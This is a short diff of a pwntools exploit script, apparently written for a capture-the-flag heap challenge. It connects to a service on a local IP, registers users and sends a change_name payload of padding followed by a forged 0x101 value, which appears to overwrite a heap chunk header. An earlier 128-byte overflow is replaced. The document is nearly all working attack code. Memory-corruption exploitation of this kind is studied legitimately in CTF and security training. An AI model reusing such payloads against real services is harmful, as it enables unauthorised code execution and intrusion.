@@ -1,5 +1,5 @@
 from pwn import *
-s = remote('192.168.50.4',1234)
+s = remote('192.168.0.85',1234)
 raw_input()
 def sign_up(name):
   s.recvuntil('>')
@@ -29,6 +29,7 @@ def send_ms(name,dat):
   s.recvuntil('>>')
   s.send(dat)
 sign_up('a1\n')
+sign_up('b1\n')
 sign_in('a1\n')
-send_timeline('A'*128)
+change_name('A'*0x10+p64(0)+p64(0x101))
 s.interactive()
